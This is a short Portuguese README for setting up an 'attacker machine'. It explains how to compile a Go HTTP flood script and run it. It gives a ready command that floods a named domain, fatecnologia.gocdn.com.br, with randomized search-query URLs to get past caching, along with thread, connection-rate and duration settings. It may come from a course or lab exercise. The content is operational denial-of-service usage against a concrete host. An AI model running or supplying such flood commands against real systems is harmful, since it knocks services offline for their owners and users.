# Configuração da Máquina Atacante
Neste caso basta que a máquina tenha a linguagem `Go` instalada.

Para isso, basta seguir o tutorial oficial de instalação no seguinte link:
`https://golang.org/doc/install`

Com Go instalado na máquina faça a compilação do script de HTTP flood presente nesse repositório:
```
go build http-flood.go
```

Após a compilação o script estará pronto para uso.

Para acessar o menu de uso basta digitar
```
./http-flood
```

Um exemplo de uso é
```
./http-flood -url https://fatecnologia.gocdn.com.br/?s= -threads 3 -connections 10 -duration 30
```

Sendo que o paramêtro `url` informa a URL que será acessada e inserida caracteres aleatório em sequência. O parâmetro `connections` informa quantas conexões serão feitas por segundo em cada thread especificada no parâmetro `threads`, enquanto o `duration` será a duração do ataque em segundos.

Exemplo de URLs que serão requisitadas:

```
https://fatecnologia.gocdn.com.br/?s=ZD4n80Aep
https://fatecnologia.gocdn.com.br/?s=INMw1a
https://fatecnologia.gocdn.com.br/?s=4fMj73K0R
https://fatecnologia.gocdn.com.br/?s=8EXyPGd-
```